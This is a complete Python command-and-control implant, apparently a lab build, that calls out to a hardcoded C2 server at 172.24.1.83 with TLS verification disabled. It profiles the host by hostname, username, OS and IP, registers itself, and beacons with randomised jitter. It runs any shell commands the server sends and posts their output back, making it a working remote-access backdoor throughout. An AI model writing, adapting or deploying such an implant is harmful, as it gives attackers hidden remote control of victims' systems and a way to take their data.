#!/usr/bin/env python3
"""
C2 Implant - HTTPS Version with SSL disabled for testing
"""

import subprocess
import requests
import json
import time
import socket
import platform
import os
import sys
import random
from datetime import datetime

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Also disable SSL verification globally
import ssl
try:
    ssl._create_default_https_context = ssl._create_unverified_context
except:
    pass

SERVER_URL = "https://172.24.1.83:443"
AGENT_ID = None

def get_system_info():
    """Collect system information"""
    try:
        # Get username
        if platform.system() == "Windows":
            username = os.environ.get('USERNAME', 'unknown')
        else:
            username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
    except:
        username = 'unknown'
    
    # Get IP address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = "127.0.0.1"
    
    return {
        "hostname": socket.gethostname(),
        "username": username,
        "os_type": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "ip_address": ip,
        "working_dir": os.getcwd()
    }

def register():
    """Register with C2 server"""
    global AGENT_ID
    try:
        info = get_system_info()
        print(f"[*] Registering with {SERVER_URL}")
        print(f"[*] System info: {info['hostname']} ({info['os_type']})")
        
        response = requests.post(
            f"{SERVER_URL}/api/register",
            json=info,
            verify=False,  # Disable SSL verification for testing
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            AGENT_ID = data.get('agent_id')
            print(f"[+] Successfully registered with ID: {AGENT_ID}")
            return True
        else:
            print(f"[-] Registration failed with status: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[*] Make sure the C2 server is running on https://172.24.1.83:443")
        return False
    except Exception as e:
        print(f"[-] Registration error: {e}")
        return False

def execute_command(command):
    """Execute system command"""
    try:
        # Handle cd command
        if command.lower().startswith('cd '):
            path = command[3:].strip()
            try:
                os.chdir(path)
                return f"[+] Changed directory to: {os.getcwd()}"
            except Exception as e:
                return f"[-] Failed to change directory: {str(e)}"
        
        # Execute command
        if platform.system() == "Windows":
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, executable='/bin/bash')
        
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "[+] Command executed successfully (no output)"
        
        return output
        
    except subprocess.TimeoutExpired:
        return "[-] Command timed out after 30 seconds"
    except Exception as e:
        return f"[-] Error: {str(e)}"

def get_tasks():
    """Get pending tasks from server"""
    try:
        response = requests.get(
            f"{SERVER_URL}/api/tasks/{AGENT_ID}",
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            return response.json()
        return []
    except Exception as e:
        print(f"[-] Error getting tasks: {e}")
        return []

def send_task_result(task_id, output):
    """Send task result back to server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/api/task_result",
            json={
                'task_id': task_id,
                'output': output,
                'status': 'completed'
            },
            verify=False,
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        print(f"[-] Error sending result: {e}")
        return False

def beacon():
    """Main beacon loop"""
    print("[*] Starting beacon loop...")
    
    while True:
        try:
            # Send heartbeat
            heartbeat = {
                'agent_id': AGENT_ID,
                'timestamp': datetime.now().isoformat(),
                'working_dir': os.getcwd()
            }
            
            response = requests.post(
                f"{SERVER_URL}/api/beacon",
                json=heartbeat,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                tasks = response.json().get('tasks', [])
                
                for task in tasks:
                    print(f"[*] Executing: {task.get('command')}")
                    output = execute_command(task.get('command'))
                    print(f"[+] Output: {output[:100]}...")
                    
                    # Send result back
                    send_task_result(task.get('id'), output)
            
            # Sleep before next beacon
            sleep_time = random.randint(5, 15)
            time.sleep(sleep_time)
            
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            time.sleep(30)

def main():
    """Main execution"""
    print("="*50)
    print("C2 Implant Starting...")
    print("="*50)
    print(f"[*] Server: {SERVER_URL}")
    print(f"[*] Platform: {platform.system()}")
    print(f"[*] Hostname: {socket.gethostname()}")
    print("="*50)
    
    if register():
        beacon()
    else:
        print("[*] Retrying in 30 seconds...")
        time.sleep(30)
        main()

if __name__ == "__main__":
    main()
